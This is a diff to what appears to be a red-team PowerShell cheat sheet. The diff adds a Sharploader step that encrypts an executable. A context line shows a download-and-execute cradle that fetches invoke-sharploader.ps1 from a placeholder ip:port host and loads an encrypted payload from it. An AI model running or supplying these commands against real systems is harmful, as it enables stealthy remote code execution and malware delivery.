@@ -187,6 +187,10 @@ invoke-Command -ScriptBlock {whoami} -Session $sess
 ##### Sharploader
 
 ```powershell
+Invoke-SharpEncrypt -file C:\Path\to\file.exe -password SuperDumperStrongPassword -outfile C:\Path\to\file.enc
+```
+
+```powershell
 iex(new-object net.webclient).downloadstring('http://ip:port/invoke-sharploader.ps1');invoke-sharploader -location http://ip:port/program.enc -password password -noArgs`
 ```
 
